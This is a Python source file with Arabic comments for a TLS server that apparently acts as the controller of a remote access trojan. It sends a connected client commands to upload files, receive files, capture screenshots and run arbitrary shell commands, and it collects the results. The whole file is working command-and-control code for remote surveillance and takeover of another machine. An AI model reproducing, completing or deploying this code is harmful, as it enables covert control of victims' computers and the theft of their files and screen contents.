import socket
import ssl
import os
import json
import logging

# إعداد السجل لتسجيل العمليات
logging.basicConfig(filename='server.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# تحميل الإعدادات من ملف config.json
with open('config.json', 'r', encoding='utf-8') as config_file:
    config = json.load(config_file)

HOST = config['host']
PORT = config['port']

def handle_client(client_socket):
    """التعامل مع العميل وإدارة الأوامر."""
    try:
        while True:
            command = input("Enter command (upload/download/screenshot/run/exit): ")
            if command.lower() == "exit":
                client_socket.send(b"exit")
                logging.info("Connection closed by server.")
                break
            elif command.startswith("upload"):
                filepath = input("Enter file path to upload: ")
                client_socket.send(f"upload*{filepath}".encode())
                receive_file(client_socket)
            elif command.startswith("download"):
                filename = input("Enter file name to send to client: ")
                client_socket.send(f"download*{filename}".encode())
                send_file_in_chunks(client_socket, filename)
            elif command.lower() == "screenshot":
                client_socket.send(b"screenshot")
                receive_file(client_socket)
            elif command.startswith("run"):
                cmd = command[4:]
                client_socket.send(f"run*{cmd}".encode())
                receive_response(client_socket)
            else:
                print("[ERROR] Unknown command.")
                logging.warning("Unknown command received.")
    except Exception as e:
        logging.error(f"[ERROR] {e}")
    finally:
        client_socket.close()

def send_file_in_chunks(client_socket, filename):
    """إرسال ملف إلى العميل على أجزاء."""
    try:
        if os.path.exists(filename):
            filesize = os.path.getsize(filename)
            client_socket.send(f"filedata*{filesize}".encode())
            response = client_socket.recv(1024).decode()

            if response == "[INFO] Ready to receive file.":
                with open(filename, "rb") as file:
                    while chunk := file.read(4096):
                        client_socket.sendall(chunk)
                logging.info(f"[INFO] Sent file: {filename}")
                print(f"[INFO] File sent successfully: {filename}")
                client_socket.send(b"[INFO] File sent successfully.")
            else:
                logging.error("[ERROR] Client not ready to receive file.")
        else:
            client_socket.send(b"[ERROR] File not found.")
            logging.error("[ERROR] File not found.")
    except Exception as e:
        logging.error(f"[ERROR] {e}")
        client_socket.send(f"[ERROR] {e}".encode())

def receive_file(client_socket):
    """استقبال ملف من العميل."""
    response = client_socket.recv(1024).decode()
    if response.startswith("upload"):
        _, filename, filesize = response.split("*")
        filesize = int(filesize)
        client_socket.send(b"[INFO] Ready to receive file.")

        received_data = b""
        while len(received_data) < filesize:
            packet = client_socket.recv(min(4096, filesize - len(received_data)))
            if not packet:
                break
            received_data += packet

        with open(filename, "wb") as file:
            file.write(received_data)

        logging.info(f"[INFO] Received file: {filename}")
        print(f"[INFO] File received: {filename}")
        client_socket.send(b"[INFO] File received successfully.")
    else:
        logging.error(f"[ERROR] {response}")

def receive_response(client_socket):
    """استقبال الرد من العميل بعد تنفيذ الأوامر."""
    response = client_socket.recv(4096).decode()
    print(f"[CLIENT RESPONSE]: {response}")

if __name__ == "__main__":
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    client_socket, client_address = server.accept()
    secure_client_socket = context.wrap_socket(client_socket, server_side=True)
    handle_client(secure_client_socket)
